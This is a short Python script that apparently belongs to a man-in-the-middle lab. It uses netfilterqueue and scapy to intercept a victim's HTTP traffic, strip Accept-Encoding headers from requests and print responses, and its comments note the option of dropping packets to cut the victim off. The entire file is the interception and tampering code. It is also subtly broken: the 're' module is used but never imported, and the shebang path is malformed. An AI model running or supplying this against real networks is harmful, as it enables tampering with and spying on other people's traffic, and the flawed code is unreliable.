#!/usr/bin/env/python3


import netfilterqueue
import scapy.all as scapy



def set_load(scapy_packet, packet):
    scapy_packet[scapy.Raw].load = packet

    # print(scapy_packet.show())

    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.TCP].chksum
    del scapy_packet[scapy.IP].chksum
    return scapy_packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())  # make the payload as a scapy packet
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            # HTTP REQUEST
            print("HTTP REQUEST")
            modified_load=re.sub("Accept-Encoding:.*?\\r\\n","",scapy_packet[scapy.Raw].load)
            new_packet=set_load(scapy_packet,modified_load)
            packet.set_payload(str(new_packet))
            print(scapy_packet.show())


        elif scapy_packet[scapy.TCP].sport == 80:
            #HTTP RESPONSE
            print("HTTP RESPONSE")
            print(scapy_packet.show())
            
    # print(packet.get_payload()) # get_payload --> Actual content of the packet
    packet.accept()  # The victim can access the sites
    # packet.drop() #Cut the internet


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  # bind will make the variable 'queue' to bind with the queue which we ran on the terminal
queue.run()

